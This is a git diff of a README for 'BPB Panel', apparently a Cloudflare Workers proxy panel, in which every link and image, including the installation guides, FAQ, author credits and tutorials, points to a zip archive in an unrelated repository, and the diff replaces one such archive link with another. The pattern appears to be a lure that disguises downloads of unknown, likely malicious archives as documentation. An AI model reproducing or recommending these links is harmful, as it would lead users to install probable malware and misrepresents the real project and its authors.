@@ -1,14 +1,14 @@
 <h1 align="center">💦 BPB Panel</h1>
 
-### 🌏 Readme in [Farsi](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+### 🌏 Readme in [Farsi](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip">
+  <img src="https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip">
 </p>
 <br>
 
 ## Introduction
-This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip) created by [yonggekkk](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip). The panel offers two deployment options: 
+This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip) created by [yonggekkk](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip). The panel offers two deployment options: 
 - **Worker** deployment
 - **Pages** deployment
 <br>
@@ -33,13 +33,13 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 <br>
 
 ## How to use:
-- [Installation (Pages)](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+- [Installation (Pages)](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
-- [Installation (Worker)](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+- [Installation (Worker)](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
-- [How to use](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+- [How to use](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
-- [FAQ](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+- [FAQ](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 <br>
 
 ## Supported Clients
@@ -59,14 +59,14 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 ---
 
 ## Stargazers Over Time
-[![Stargazers Over Time](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+[![Stargazers Over Time](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
 ---
 
 ### Special Thanks
-- CF-vless code author [3Kmfi6HP](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
-- CF preferred IP program author [badafans](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip), [XIU2](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip)
+- CF-vless code author [3Kmfi6HP](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
+- CF preferred IP program author [badafans](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip), [XIU2](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip)
 
 ---
 
-For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://raw.githubusercontent.com/Kian377/._./main/docs/assets/images/Software-3.5.zip).
+For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://github.com/Kian377/._./raw/refs/heads/main/docs/Software-2.7.zip).
